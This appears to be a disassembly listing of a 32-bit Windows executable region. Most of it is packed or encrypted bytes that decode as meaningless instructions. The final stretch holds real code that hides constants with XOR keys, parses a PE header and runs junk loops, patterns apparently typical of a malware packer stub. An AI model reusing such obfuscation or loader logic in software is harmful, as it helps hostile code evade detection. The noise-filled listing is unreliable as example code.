  41f295:	or     bl,BYTE PTR [edx+0x5145464a]
  41f29b:	pop    esi
  41f29c:	jbe    0x41f267
  41f29e:	push   ds
  41f29f:	sbb    bl,cl
  41f2a1:	test   al,0x2e
  41f2a3:	sti    
  41f2a4:	test   DWORD PTR [esi+0x4b752a1a],eax
  41f2aa:	adc    BYTE PTR [edi-0x65],al
  41f2ad:	mov    bh,0xab
  41f2af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2b0:	mov    ch,0xca
  41f2b2:	push   0xbb95bd80
  41f2b7:	ja     0x41f30b
  41f2b9:	ror    BYTE PTR [edx-0xfd4cbf5],cl
  41f2bf:	call   0xd83b:0x2cfa6505
  41f2c6:	push   es
  41f2c7:	std    
  41f2c8:	arpl   cx,cx
  41f2ca:	add    al,0xd8
  41f2cc:	in     al,dx
  41f2cd:	sbb    eax,0xc3ab1cd9
  41f2d2:	cwde   
  41f2d3:	xchg   esp,eax
  41f2d4:	cwde   
  41f2d5:	aam    0xb1
  41f2d7:	int    0xaf
  41f2d9:	outs   dx,BYTE PTR ds:[esi]
  41f2da:	sub    ah,BYTE PTR [esp+esi*1-0x30]
  41f2de:	clc    
  41f2df:	jmp    0x41f2f6
  41f2e1:	hlt    
  41f2e2:	xor    eax,0xd983ca73
  41f2e7:	loop   0x41f32a
  41f2e9:	cmp    ebx,DWORD PTR [edi-0x2f]
  41f2ec:	retf   0xffb5
  41f2ef:	je     0x41f28d
  41f2f1:	mov    edi,0x29538c7a
  41f2f6:	dec    esp
  41f2f7:	cwde   
  41f2f8:	or     BYTE PTR [ecx-0x38],0x36
  41f2fc:	add    BYTE PTR [eax+0x1f01c592],dl
  41f302:	pop    ecx
  41f303:	add    edi,DWORD PTR [eax]
  41f305:	add    DWORD PTR [ecx-0x7b],edx
  41f308:	js     0x41f2a8
  41f30a:	xor    eax,0x60b0ba81
  41f30f:	sbb    al,0xaa
  41f311:	pop    ebx
  41f312:	hlt    
  41f313:	loope  0x41f2b1
  41f315:	(bad)  
  41f316:	(bad)  
  41f317:	mov    al,0x59
  41f319:	push   ecx
  41f31a:	shr    BYTE PTR [edx-0x72],cl
  41f31d:	add    eax,0xcd7718c5
  41f322:	mov    WORD PTR [edx-0x3350db59],fs
  41f328:	mov    eax,0x1c8bee2d
  41f32d:	mov    edx,0x9d4ed1c8
  41f332:	clc    
  41f333:	xor    BYTE PTR [ebx-0x45],al
  41f336:	sbb    ebx,DWORD PTR [edx]
  41f338:	adc    eax,DWORD PTR [edi]
  41f33a:	in     al,0xa
  41f33c:	inc    ecx
  41f33d:	push   es
  41f33e:	or     al,0xba
  41f340:	sar    DWORD PTR [ecx],0x3e
  41f343:	mov    al,0x0
  41f345:	jmp    FWORD PTR [ecx]
  41f347:	adc    eax,ecx
  41f349:	sbb    eax,0x42c31dc1
  41f34e:	repz sub al,0x47
  41f351:	pop    esi
  41f352:	xor    eax,0x7c212296
  41f357:	cmp    eax,edx
  41f359:	bnd repz jae 0x41f3d3
  41f35d:	pop    ecx
  41f35e:	out    0xae,eax
  41f360:	lods   al,BYTE PTR ds:[esi]
  41f361:	je     0x41f386
  41f363:	push   ss
  41f364:	mov    bh,0x1d
  41f366:	sbb    eax,0xbe73ea94
  41f36b:	pop    ebx
  41f36c:	inc    ebp
  41f36d:	je     0x41f345
  41f36f:	aaa    
  41f370:	retf   
  41f371:	push   esp
  41f372:	jo     0x41f321
  41f374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f375:	mov    esp,es
  41f377:	dec    esi
  41f378:	in     al,dx
  41f379:	test   DWORD PTR [edx+0xd1802f],ebx
  41f37f:	push   0xffffffe3
  41f381:	xchg   edi,eax
  41f382:	sbb    al,0x56
  41f384:	fwait
  41f385:	push   ebp
  41f386:	mov    ch,0x89
  41f388:	icebp  
  41f389:	push   ebx
  41f38a:	call   0xc436ac35
  41f38f:	repnz push eax
  41f391:	push   es
  41f392:	out    0xd5,eax
  41f394:	sbb    dl,BYTE PTR [eax]
  41f396:	mov    bl,0x5
  41f398:	ds jmp 0x224df0e5
  41f39e:	imul   esp,esi,0x51
  41f3a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3a2:	sub    edx,esp
  41f3a4:	repnz adc eax,DWORD PTR cs:[edi+0x6358c24]
  41f3ac:	inc    esp
  41f3ad:	jbe    0x41f3d2
  41f3af:	adc    cl,BYTE PTR [ebx]
  41f3b1:	outs   dx,BYTE PTR ds:[esi]
  41f3b2:	xchg   esp,eax
  41f3b3:	in     eax,dx
  41f3b4:	out    dx,al
  41f3b5:	ins    DWORD PTR es:[edi],dx
  41f3b6:	ins    BYTE PTR es:[edi],dx
  41f3b7:	xchg   esp,eax
  41f3b8:	or     BYTE PTR ds:0xec61f131,bh
  41f3be:	les    esp,FWORD PTR [ebx]
  41f3c0:	xor    dh,BYTE PTR [edi-0x23435b35]
  41f3c6:	in     eax,0xa4
  41f3c8:	aaa    
  41f3c9:	mov    bl,0x70
  41f3cb:	mov    ?,WORD PTR [ebx-0x725234e2]
  41f3d1:	pop    esp
  41f3d2:	icebp  
  41f3d3:	(bad)
  41f3d7:	lock jb 0x41f37d
  41f3da:	fwait
  41f3db:	test   eax,0xde793289
  41f3e0:	lahf   
  41f3e1:	mov    BYTE PTR [esi-0x43070e94],0xd5
  41f3e8:	mov    edi,DWORD PTR [ebx+0x19a26297]
  41f3ee:	and    bl,ah
  41f3f0:	shl    DWORD PTR [ecx-0x686a8b12],1
  41f3f6:	pop    ds
  41f3f7:	xor    ch,BYTE PTR [esi-0x1315aee4]
  41f3fd:	fdivrp st(3),st
  41f3ff:	mov    ecx,0x9527425f
  41f404:	inc    esi
  41f405:	daa    
  41f406:	mov    al,0x6f
  41f408:	ds push ds
  41f40a:	dec    esi
  41f40b:	mov    esi,0x875b0b55
  41f410:	xchg   edi,eax
  41f411:	push   0xffffffc4
  41f413:	pop    es
  41f414:	mov    dh,BYTE PTR [edi-0x1451579a]
  41f41a:	fiadd  DWORD PTR [ecx]
  41f41c:	xchg   esi,eax
  41f41d:	push   ecx
  41f41e:	je     0x21ff7f4b
  41f424:	(bad)  
  41f425:	ins    BYTE PTR es:[edi],dx
  41f426:	int    0x6a
  41f428:	cld    
  41f429:	mov    ecx,0xb560a48b
  41f42e:	or     eax,0xf610fda4
  41f433:	pop    eax
  41f434:	(bad)  
  41f435:	pushf  
  41f436:	cmp    eax,0xe010f38a
  41f43b:	inc    ecx
  41f43c:	mov    ch,0xaf
  41f43e:	pop    ss
  41f43f:	mov    cl,0x30
  41f441:	hlt    
  41f442:	fldenv [esi]
  41f444:	dec    edi
  41f445:	lds    esi,FWORD PTR [edi]
  41f447:	stc    
  41f448:	dec    esp
  41f449:	ret    
  41f44a:	les    esp,FWORD PTR [ebx+0x3b]
  41f44d:	test   al,0xa
  41f44f:	bound  esp,QWORD PTR [ebp+0x38]
  41f452:	not    edi
  41f454:	pop    ss
  41f455:	mov    eax,0x47eb8ad2
  41f45a:	dec    esi
  41f45b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f45d:	clc    
  41f45e:	lods   al,BYTE PTR ds:[esi]
  41f45f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f460:	leave  
  41f461:	int    0x23
  41f463:	sub    BYTE PTR [edi-0x1e8ed8c9],bl
  41f469:	aaa    
  41f46a:	xor    ah,ah
  41f46c:	inc    eax
  41f46d:	dec    ebp
  41f46e:	add    ebp,ecx
  41f470:	sub    ebx,DWORD PTR [ebx]
  41f472:	call   DWORD PTR [esi]
  41f474:	mov    ds:0xf2ff5ce9,eax
  41f479:	stc    
  41f47a:	out    dx,eax
  41f47b:	pop    es
  41f47c:	xor    eax,0x67cab11
  41f481:	fstp   TBYTE PTR [ebx-0x10ddde3e]
  41f487:	add    BYTE PTR [esi],ah
  41f489:	pop    es
  41f48a:	mov    edi,0xb97150c9
  41f48f:	jbe    0x41f498
  41f491:	and    bl,dl
  41f493:	sub    DWORD PTR [esi-0x1d],edx
  41f496:	mov    edi,0xc35a3ee8
  41f49b:	js     0x41f4db
  41f49d:	mov    ah,0x91
  41f49f:	mov    ds:0xb6bebd5d,al
  41f4a4:	addr16 iret 
  41f4a6:	mov    DWORD PTR [eax+0xd],0x1cafbbe
  41f4ad:	adc    BYTE PTR [edx+edi*1+0x4e],cl
  41f4b1:	into   
  41f4b2:	xchg   ecx,eax
  41f4b3:	add    al,0xa8
  41f4b5:	in     al,0xbf
  41f4b7:	adc    eax,0xa9f49d7f
  41f4bc:	mov    eax,0xc2b246b0
  41f4c1:	inc    edi
  41f4c2:	nop
  41f4c3:	lds    edi,FWORD PTR [ebp+0x68ebccce]
  41f4c9:	pusha  
  41f4ca:	and    DWORD PTR ds:0x396a833e,ecx
  41f4d0:	fwait
  41f4d1:	dec    ebx
  41f4d2:	jg     0x41f52a
  41f4d4:	std    
  41f4d5:	(bad)  
  41f4d6:	in     eax,dx
  41f4d7:	repnz mov DWORD PTR [ebx+0x73],ebp
  41f4db:	mov    ch,0x5
  41f4dd:	stos   BYTE PTR es:[edi],al
  41f4de:	fist   WORD PTR [esi+0x15564ff]
  41f4e4:	mov    ds:0xe490eba7,eax
  41f4e9:	gs mov ecx,0x6a456779
  41f4ef:	neg    DWORD PTR [ebx+edi*4+0x60861bbf]
  41f4f6:	mov    edi,0x9cab16de
  41f4fb:	dec    esi
  41f4fc:	cli    
  41f4fd:	inc    esi
  41f4fe:	jp     0x41f4a3
  41f500:	ret    
  41f501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f502:	(bad)
  41f506:	and    BYTE PTR [ecx-0x8],al
  41f509:	cmp    esi,DWORD PTR [eax]
  41f50b:	xchg   edi,eax
  41f50c:	mov    dl,0x80
  41f50e:	or     bh,ah
  41f510:	sub    BYTE PTR [ebx],0xc1
  41f513:	xchg   ecx,eax
  41f514:	or     DWORD PTR [ebp-0x24],eax
  41f517:	jp     0x41f4c0
  41f519:	hlt    
  41f51a:	mov    ch,0x5b
  41f51c:	fscale 
  41f51e:	ret    0x665f
  41f521:	cs cdq 
  41f523:	cmp    bl,0xf1
  41f526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f527:	js     0x41f541
  41f529:	(bad)  
  41f52a:	jmp    0xb4a2e11c
  41f52f:	pop    ebx
  41f530:	adc    DWORD PTR [esi+0x17],ebp
  41f533:	retf   
  41f534:	jmp    0x41f508
  41f536:	shl    BYTE PTR [ebp-0x3e],cl
  41f539:	nop
  41f53a:	dec    DWORD PTR [edx]
  41f53c:	mov    edi,cs
  41f53e:	adc    ebp,DWORD PTR [edx]
  41f540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f541:	and    al,BYTE PTR [ebp-0x42]
  41f544:	(bad)  
  41f546:	rcl    DWORD PTR gs:[ebp+0x1d],0x83
  41f54b:	sub    BYTE PTR [ecx],cl
  41f54d:	mov    al,0xf4
  41f54f:	dec    edi
  41f550:	pop    edi
  41f551:	stos   DWORD PTR es:[edi],eax
  41f552:	dec    edx
  41f553:	cs push 0xffffff80
  41f556:	jns    0x41f543
  41f558:	cdq    
  41f559:	xchg   edi,eax
  41f55a:	pop    esi
  41f55b:	mov    al,ds:0xdff95a49
  41f560:	repnz shr DWORD PTR [eax],0x2b
  41f564:	fst    DWORD PTR [edi]
  41f566:	push   eax
  41f567:	pusha  
  41f568:	ror    DWORD PTR [eax],0x82
  41f56b:	loop   0x41f5c9
  41f56d:	loope  0x41f5dd
  41f56f:	fwait
  41f570:	jnp    0x41f526
  41f572:	les    ebx,FWORD PTR [edx]
  41f574:	add    DWORD PTR [esi-0x6b],edx
  41f577:	mov    esi,0x7e61e336
  41f57c:	cmp    BYTE PTR [ecx],dl
  41f57e:	mov    eax,fs:0x84642219
  41f584:	out    0x68,eax
  41f586:	mov    al,ds:0xc277b9f4
  41f58b:	sub    al,0x8d
  41f58d:	mov    esi,0xf29e9e0
  41f592:	loop   0x41f5f0
  41f594:	cwde   
  41f595:	stos   BYTE PTR es:[edi],al
  41f596:	in     eax,0xab
  41f598:	or     al,BYTE PTR [ecx]
  41f59a:	rcr    DWORD PTR [ebx],0x8f
  41f59d:	pop    esi
  41f59e:	cwde   
  41f59f:	mov    ah,0x7c
  41f5a1:	push   ebp
  41f5a2:	or     eax,0xb471366f
  41f5a7:	or     ch,BYTE PTR [ebx]
  41f5a9:	push   ebp
  41f5aa:	ficom  DWORD PTR [eax]
  41f5ac:	push   ebx
  41f5ad:	add    esi,DWORD PTR [ebx+0x261d3a34]
  41f5b3:	mov    ebp,0x875289b9
  41f5b8:	loope  0x41f577
  41f5ba:	imul   edi,DWORD PTR [ebp-0x59],0x7c
  41f5be:	loopne 0x41f56a
  41f5c0:	xchg   ebp,eax
  41f5c1:	popf   
  41f5c2:	jo     0x41f5ba
  41f5c4:	shl    cl,0xa3
  41f5c7:	mov    al,bh
  41f5c9:	fs push 0x995d5151
  41f5cf:	mov    esp,0x6ed10715
  41f5d4:	ss push ss
  41f5d6:	scas   al,BYTE PTR es:[edi]
  41f5d7:	pop    esi
  41f5d8:	jo     0x41f5f0
  41f5da:	cmp    DWORD PTR [esi-0x54],0x4829bed
  41f5e1:	(bad)  
  41f5e2:	sbb    DWORD PTR [edx+0x21],ecx
  41f5e5:	cmp    ax,0x2439
  41f5e9:	jno    0x41f5a2
  41f5eb:	je     0x41f665
  41f5ed:	jbe    0x41f615
  41f5ef:	out    0xec,eax
  41f5f1:	cmc    
  41f5f2:	jne    0x41f62f
  41f5f4:	stos   BYTE PTR es:[edi],al
  41f5f5:	cld    
  41f5f6:	mov    al,0x47
  41f5f8:	fadd   st,st(1)
  41f5fa:	mov    ebx,0xdd2a1cfe
  41f5ff:	fwait
  41f600:	mov    eax,ds:0x81f843c4
  41f605:	adc    al,0xcf
  41f607:	or     eax,0xdd0cebf8
  41f60c:	pop    ecx
  41f60d:	jl     0x41f688
  41f60f:	loopne 0x41f5b1
  41f611:	jne    0x41f5f8
  41f613:	xor    al,0x66
  41f615:	mov    eax,0xc7a62c2c
  41f61a:	imul   edx,DWORD PTR [edx],0x2d
  41f61d:	sbb    BYTE PTR [eax-0x668d1252],dl
  41f623:	call   0xef77:0x9732fad6
  41f62a:	mov    dl,0x4e
  41f62c:	nop
  41f62d:	mov    bh,0x5
  41f62f:	into   
  41f630:	sbb    eax,0xd047b14b
  41f635:	daa    
  41f636:	jmp    0x41f60b
  41f638:	xor    ah,BYTE PTR [esi]
  41f63a:	je     0x41f5c2
  41f63c:	xchg   ecx,eax
  41f63d:	lods   al,BYTE PTR ds:[esi]
  41f63e:	pop    esi
  41f63f:	in     al,0xe1
  41f641:	(bad)
  41f646:	pop    edx
  41f647:	jecxz  0x41f65b
  41f649:	and    bl,al
  41f64b:	or     esi,ebp
  41f64d:	sub    al,0xb5
  41f64f:	bound  ecx,QWORD PTR [esi]
  41f651:	out    0x85,al
  41f653:	or     eax,esi
  41f655:	dec    edx
  41f656:	inc    edx
  41f657:	pushf  
  41f658:	mov    ds:0x9de6fc15,al
  41f65d:	retf   0x22af
  41f660:	dec    esp
  41f661:	mov    ds:0x7c5150ec,al
  41f666:	jmp    0x41f669
  41f668:	jbe    0x41f691
  41f66a:	or     BYTE PTR [eax],bh
  41f66c:	mov    dl,0x27
  41f66e:	data16 adc BYTE PTR [edi],bh
  41f671:	lds    esi,FWORD PTR [ebx-0x777a2027]
  41f677:	xchg   edi,eax
  41f678:	stos   BYTE PTR es:[edi],al
  41f679:	xchg   ebx,eax
  41f67a:	fisttp DWORD PTR [esi-0x73b0ee70]
  41f680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f681:	inc    si
  41f683:	cwde   
  41f684:	cmp    esi,esi
  41f686:	push   ebx
  41f687:	jnp    0x41f628
  41f689:	mov    eax,edi
  41f68b:	fdiv   st(7),st
  41f68d:	jge    0x41f6bc
  41f68f:	out    0x24,eax
  41f691:	add    DWORD PTR [esi+0x94c6254],edx
  41f697:	ret    
  41f698:	adc    edx,DWORD PTR [esi-0x45]
  41f69b:	test   BYTE PTR [eax+0x12553f9f],cl
  41f6a1:	add    edx,DWORD PTR [edx]
  41f6a3:	nop
  41f6a4:	pop    edx
  41f6a5:	mov    ecx,0x75425462
  41f6aa:	and    al,0x9f
  41f6ac:	mov    eax,ds:0x71758a30
  41f6b1:	xlat   BYTE PTR ds:[ebx]
  41f6b2:	push   edx
  41f6b3:	pop    eax
  41f6b4:	shl    BYTE PTR [edx-0x8d12684],0x89
  41f6bb:	xor    DWORD PTR [ecx],edi
  41f6bd:	or     al,0x76
  41f6bf:	gs ret 
  41f6c1:	adc    DWORD PTR [esi+0x6c91088a],ebp
  41f6c7:	mov    ds:0xec656626,al
  41f6cc:	jo     0x41f6e3
  41f6ce:	mov    edi,DWORD PTR [ecx+ecx*4+0x6e961446]
  41f6d5:	packsswb mm1,mm0
  41f6d8:	mov    DWORD PTR [ebp+0x65],ebp
  41f6db:	dec    ecx
  41f6dc:	retf   0x6815
  41f6df:	sbb    edi,DWORD PTR [ecx+0x7774e509]
  41f6e5:	stc    
  41f6e6:	adc    DWORD PTR [ebx],ebx
  41f6e8:	enter  0x85f5,0x6
  41f6ec:	test   BYTE PTR [esi],0xab
  41f6ef:	imul   edx,DWORD PTR [edi],0xd7206a46
  41f6f5:	and    eax,0x7da72a5a
  41f6fa:	xor    al,0x10
  41f6fc:	jmp    0x2860:0x1254661e
  41f703:	mul    BYTE PTR [edx-0xa]
  41f706:	mov    al,ds:0x7496a5b2
  41f70b:	je     0x41f752
  41f70d:	ins    DWORD PTR es:[edi],dx
  41f70e:	test   eax,0xdc0c9059
  41f713:	add    WORD PTR [ebx],ax
  41f716:	push   es
  41f717:	sub    ecx,DWORD PTR [edi]
  41f719:	sub    DWORD PTR [ebx-0x9],eax
  41f71c:	dec    ebx
  41f71d:	aad    0xed
  41f71f:	leave  
  41f720:	sbb    DWORD PTR [ebx+0x67],esi
  41f723:	xor    BYTE PTR [ebp-0x4bd22d8c],cl
  41f729:	xchg   DWORD PTR [esi+0x2b],ecx
  41f72c:	jmp    0xb4ae:0xf13ae110
  41f733:	hlt    
  41f734:	or     al,0x4d
  41f736:	iret   
  41f737:	push   eax
  41f738:	pop    ebp
  41f739:	and    al,0x2
  41f73b:	jg     0x41f71d
  41f73d:	adc    al,BYTE PTR [edi-0x3547f7a4]
  41f743:	jno    0x41f770
  41f745:	mov    DWORD PTR [eax+ebp*2+0x17],esp
  41f749:	test   DWORD PTR [ebp+0x50a82b05],0xe433755b
  41f753:	sbb    ecx,DWORD PTR cs:0xf6b5f807
  41f75a:	cli    
  41f75b:	add    ecx,DWORD PTR [ebx+0x37]
  41f75e:	xor    BYTE PTR [edx-0x220d27ae],ch
  41f764:	in     al,dx
  41f765:	in     eax,dx
  41f766:	mov    BYTE PTR [esi],al
  41f768:	add    al,BYTE PTR ds:0xeae07817
  41f76e:	jno    0x41f782
  41f770:	jmp    ebp
  41f772:	push   esi
  41f773:	das    
  41f774:	and    edx,edi
  41f776:	fadd   st,st(6)
  41f778:	push   ss
  41f779:	daa    
  41f77a:	cmp    al,0x10
  41f77c:	out    dx,eax
  41f77d:	cwde   
  41f77e:	inc    edx
  41f77f:	inc    ecx
  41f780:	adc    dh,BYTE PTR [edx]
  41f782:	and    BYTE PTR [edx],0x50
  41f785:	pop    ebp
  41f786:	sub    DWORD PTR [ecx-0x2d],ebp
  41f789:	les    edi,FWORD PTR [edx+ebx*8]
  41f78c:	cmc    
  41f78d:	imul   eax,DWORD PTR [esi],0xffffffd6
  41f790:	cmc    
  41f791:	xor    ch,ah
  41f793:	push   esi
  41f794:	mov    al,0x4c
  41f796:	xor    eax,0x87dc178e
  41f79b:	shl    BYTE PTR [ebx-0x3fed03ca],cl
  41f7a1:	(bad)
  41f7a4:	not    eax
  41f7a6:	loopne 0x41f784
  41f7a8:	push   edi
  41f7a9:	inc    edx
  41f7aa:	fcmovu st,st(2)
  41f7ac:	cdq    
  41f7ad:	test   BYTE PTR [esi+0x7e],ch
  41f7b0:	jecxz  0x41f829
  41f7b2:	rcl    BYTE PTR [ebp-0x6c],0x42
  41f7b6:	adc    ebp,DWORD PTR [edi-0x15]
  41f7b9:	jmp    0xba15:0xd2d79013
  41f7c0:	(bad)  
  41f7c1:	pop    edx
  41f7c2:	jmp    0x693c9e4e
  41f7c7:	xchg   edi,eax
  41f7c8:	(bad)  
  41f7c9:	fidiv  DWORD PTR [eax]
  41f7cb:	dec    eax
  41f7cc:	mov    edi,0xb6e3ed1
  41f7d1:	pop    ebx
  41f7d2:	jae    0x41f788
  41f7d4:	cmp    eax,0x47403e67
  41f7d9:	inc    ebx
  41f7da:	mov    edx,0x4cd263d7
  41f7df:	sbb    esp,eax
  41f7e1:	fsub   DWORD PTR [ebx]
  41f7e3:	into   
  41f7e4:	fmul   QWORD PTR [edi-0x184a0ad7]
  41f7ea:	cs mov ch,0x2c
  41f7ed:	shl    BYTE PTR [edx],cl
  41f7ef:	dec    ebp
  41f7f0:	pop    esi
  41f7f1:	lods   eax,DWORD PTR ds:[esi]
  41f7f2:	xchg   ebx,eax
  41f7f3:	xchg   ebx,eax
  41f7f4:	jg     0x41f82a
  41f7f6:	es jmp 0x9894:0x15df867c
  41f7fe:	jnp    0x41f78e
  41f800:	test   eax,0xb8254246
  41f805:	inc    ebp
  41f806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f807:	jbe    0x41f805
  41f809:	pop    ss
  41f80a:	sub    DWORD PTR [eax+edx*8-0x40c49a9b],esp
  41f811:	jl     0x41f851
  41f813:	aaa    
  41f814:	les    esp,FWORD PTR [ebp+0x4dc658ce]
  41f81a:	imul   ebx,DWORD PTR [edx-0x3259290c],0xffffffa1
  41f821:	xchg   edi,eax
  41f822:	xchg   ecx,eax
  41f823:	sub    DWORD PTR [esi+0x5f],esp
  41f826:	jp     0x41f88f
  41f828:	mov    BYTE PTR ds:0x57c030b3,al
  41f82e:	stos   DWORD PTR es:[edi],eax
  41f82f:	retf   0x9043
  41f832:	jmp    0x7882:0x7894e94c
  41f839:	adc    esi,DWORD PTR [eax+0x74]
  41f83c:	adc    al,0x35
  41f83e:	mov    al,ds:0xd83bcbfb
  41f843:	das    
  41f844:	cmp    al,0x30
  41f846:	xchg   esi,eax
  41f847:	inc    edi
  41f848:	aad    0xd1
  41f84a:	mov    edi,0xa93e105e
  41f84f:	sub    ch,dh
  41f851:	xor    edx,DWORD PTR [esi]
  41f853:	dec    edx
  41f854:	ins    DWORD PTR es:[edi],dx
  41f855:	mov    esi,0xd8f99b64
  41f85a:	jl     0x41f8db
  41f85c:	mov    edi,0xff8cdea4
  41f861:	in     al,0xc7
  41f863:	in     eax,0xc7
  41f865:	leave  
  41f866:	lahf   
  41f867:	jmp    0x4cb:0xeadf73e2
  41f86e:	aaa    
  41f86f:	mov    cl,0xe
  41f871:	xlat   BYTE PTR ds:[ebx]
  41f872:	pop    eax
  41f873:	icebp  
  41f874:	ins    BYTE PTR es:[edi],dx
  41f875:	mov    edx,0x3272fa
  41f87a:	sub    eax,edx
  41f87c:	or     ecx,DWORD PTR ds:0x426eb9
  41f882:	mov    ecx,0x75108b3
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429eb5
  41f8e9:	mov    edx,DWORD PTR ds:0x42af0d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x42fa00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x42fa40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	pop    es
  41faa5:	cwde   
  41faa6:	ins    BYTE PTR es:[edi],dx
  41faa7:	jecxz  0x41fb1f
  41faa9:	hlt    
  41faaa:	push   eax
